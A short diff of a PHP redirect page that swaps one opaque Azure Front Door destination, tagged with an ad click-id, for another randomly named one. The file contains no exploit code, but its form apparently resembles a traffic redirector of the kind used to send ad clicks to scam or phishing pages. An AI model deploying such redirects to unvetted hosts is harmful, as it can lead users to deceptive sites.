@@ -1,6 +1,6 @@
 <?php
 // You can set your redirect URL here
-$url = "https://quickchat-ayederbpbha5bvfn.z03.azurefd.net/index.php?gclid=Cj0KCQiA8KTNBhD_ARIsAOvp6DJQHfxNge0m2rgRcqFzpUd0uXDnQ4oe1dRfvzRz7WVzaWH6mcPb_3hAaAjsYEALw_746h";
+$url = "https://gpdalwared2t6kk-dphxf3fme2e9dnhz.z03.azurefd.net";
 ?>
 
 <!DOCTYPE html>
